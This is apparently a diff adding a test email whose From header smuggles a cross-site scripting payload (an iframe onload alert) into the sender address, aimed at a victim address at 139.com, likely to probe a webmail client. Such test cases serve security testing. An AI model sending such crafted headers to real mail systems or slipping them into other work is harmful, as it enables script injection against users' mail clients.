@@ -1,0 +1,7 @@
+From: <"<iframe onload=alert(/a/);>@attacker.com">
+Subject: test000
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: text/html
+
+nothing
